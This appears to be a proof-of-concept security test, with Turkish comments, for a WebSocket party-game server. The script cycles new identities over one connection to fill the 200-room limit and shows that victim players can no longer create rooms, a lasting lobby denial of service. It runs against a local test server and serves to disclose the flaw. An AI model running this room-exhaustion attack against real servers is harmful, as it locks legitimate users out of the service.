// PoC: Tek WebSocket bağlantısıyla, her seferinde yeni kimlik (hello, token yok) alıp oda kurarak
// sunucu genelindeki 200 oda sınırını doldurmak. Eski kimlikler socket referansını tuttuğu için
// bağlantı kapansa bile odalardaki oyuncular "bağlı" kalır, odalar hiç silinmez → kalıcı lobi DoS.
// Çalıştır: node tests/security/poc-room-exhaust.mjs   (~75 sn)
import WebSocket from 'ws';
import { startServer } from '../lib/server.js';
import { Bot, sleep } from '../lib/bot.js';

const srv = await startServer({ timeScale: 0.01 }); // seatHold 120 sn → 1.2 sn, emptyRoom 600 sn → 6 sn
const ws = new WebSocket(srv.wsUrl);
await new Promise((r) => ws.once('open', r));
let created = 0;
ws.on('message', (d) => { const m = JSON.parse(d); if (m.t === 'room' && m.room && m.room.players.length === 1) created++; });
// Hız sınırı: 5 sn'de 30 mesaj. 200 x (hello + create) = 400 mesaj → ~70 sn.
for (let i = 0; i < 200; i++) {
  ws.send(JSON.stringify({ t: 'hello', name: `x${i}` }));
  ws.send(JSON.stringify({ t: 'create', game: 'spyfall' }));
  if (i % 15 === 14) await sleep(5100);
}
await sleep(500);
console.log('Tek bağlantıdan kurulan oda sayısı:', created);
ws.close();
console.log('Saldırgan bağlantısı kapandı; seatHold (1.2 sn) ve emptyRoom (6 sn) sürelerinin çok üstünde bekleniyor (10 sn)...');
await sleep(10_000);

// Son kimliğin odası seatHold sonunda silinir (1 boş yer); diğer 199 oda kalır. 3 farklı kurban dener.
for (let k = 1; k <= 3; k++) {
  const probe = await new Bot(srv.wsUrl, 'Kurban' + k).connect();
  try { const code = await probe.create('spyfall'); console.log('Kurban' + k + ' oda kurabildi:', code); }
  catch (e) { console.log('Kurban' + k + ' oda kuramadı → hata:', JSON.stringify(e.message)); }
}
await srv.stop();
